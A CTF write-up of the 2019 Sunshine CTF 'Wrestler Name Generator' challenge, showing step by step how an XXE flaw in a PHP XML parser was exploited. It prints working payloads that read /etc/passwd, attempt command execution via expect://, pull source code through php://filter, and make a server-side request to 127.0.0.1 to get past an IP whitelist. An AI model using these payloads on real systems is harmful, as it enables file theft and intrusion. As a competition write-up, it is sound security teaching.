# 2019 Sunshine CTF Writeups
## Wrestler Name Generator

This challenge when using the input to generate a name, had an encoded string for the input. A quick base64 showed that it was an XML file.

```
http://ng.sunshinectf.org/generate.php?input=PD94bWwgdmVyc2lvbj0iMS4wIiA%2FPgo8IURPQ1RZUEUgciBbCjwhRUxFTUVOVCByIEFOWSA%2BCjwhRU5USVRZIHNwIFNZU1RFTSAiaHR0cDovLzEyNy4wLjAuMS9nZW5lcmF0ZS5waHAiPgpdPgo8aW5wdXQ%2BPGZpcnN0TmFtZT4mc3A7PC9maXJzdE5hbWU%2BPGxhc3ROYW1lPm9rb2s8L2xhc3ROYW1lPjwvaW5wdXQ%2B
```
Decoded: 
```xml
<?xml version='1.0' encoding='UTF-8'?><input><firstName></firstName><lastName></lastName></input>
```
Viewing the source code showed that the code was generating the XML and encoding it.
```xml
var firstName = document.getElementById("firstName").value;
var lastName = document.getElementById("lastName").value;
var input = btoa("<?xml version='1.0' encoding='UTF-8'?><input><firstName>" + firstName + "</firstName><lastName>" + lastName+ "</lastName></input>");
window.location.href = "/generate.php?input="+encodeURIComponent(input);
```
After quickly trying to create my own string to see what would happen, I eventually got an error which showed the function simplexml_load_string() was being used. A Google search showed that you could take advantage of an XXE vulnerability. 

Found the following XML example and encoded it for input to use.
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<input><firstName>&xxe;</firstName><lastName>okok</lastName></input>
?>
```
This successfully printed the entire /etc/passwd file which shows us that we have a working way to execute commands so lets see if there is a way to do more local execution.

Searching found that there is a way to do local execution, so I quickly tried it but when attempting to do the following:
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://ls" >]>
<input><firstName>&xxe;</firstName><lastName>okok</lastName></input>
```
Created an error message so I had no success in trying to execute local commands so I also attempted to do a remote shell with netcat but had no success, but this could have also been due to how the network was setup. So after this I gave up on trying to do a reverse shell.

My next step was can I just get the source code or be able to list the directory and see if the key file was there. I wasn’t sure how to get the contents if I had issues with trying to run commands locally but after glancing at comments I saw someone posted the following:
```xml
<!ENTITY entity SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```
Research showed that the advantage of using base64 is it prevents the XML from being broken by characters. From there I was able to base64 encode the generate.php I was able to pull the encode and decode it and noticed the following:
```php
$whitelist = array(
    '127.0.0.1',
    '::1'
);
// if this page is accessed from the web server, the flag is returned
// flag is in env variable to avoid people using XXE to read the flag
// REMOTE_ADDR field is able to be spoofed (unless you already are on the server)
if(in_array($_SERVER['REMOTE_ADDR'], $whitelist)){
	echo $_ENV["FLAG"];
	return;
}
```
At first this was confusing saying that you are able to spoof which cost me more time on this then all the other parts together. I spent too much time trying to spoof the IP with cURL and PHP scripts attempting to get the page to print the key by changing the headers of the IP being passed.

After showing a club mate they helped me give up on the idea of trying to spoof because it wasn’t going to be possible, so the next trick was to have the server open the web page locally. Looked over the webpages I had open and tried the following since it looked like it might work.
```xml
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY sp SYSTEM "http://ng.sunshinectf.org//generate.php">
]>
<input><firstName>&sp;</firstName><lastName>okok</lastName></input>
```
Well that didn’t work. Then it dawned on me and I quickly tried it with the local IP to prevent making an out going connection.
```xml
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY sp SYSTEM "http://127.0.0.1/generate.php">
]>
<input><firstName>&sp;</firstName><lastName>okok</lastName></input>
```
That worked and gave me the key: 

Your Wrestler Name Is:
sun{1_l0v3_hulk_7h3_3x73rn4l_3n717y_h064n} "The Brute" okok


##### REFS:

https://skavans.ru/en/2017/12/02/xxe-oob-extracting-via-httpftp-using-single-opened-port/ 
https://gist.github.com/staaldraad/01415b990939494879b4 
https://medium.com/bugbountywriteup/devoops-an-xml-external-entity-xxe-hackthebox-walkthrough-fb5ba03aaaa2 
https://www.blackhillsinfosec.com/xml-external-entity-beyond-etcpasswd-fun-profit/
https://gardienvirtuel.ca/fr/actualites/from-xml-to-rce.php
https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection 


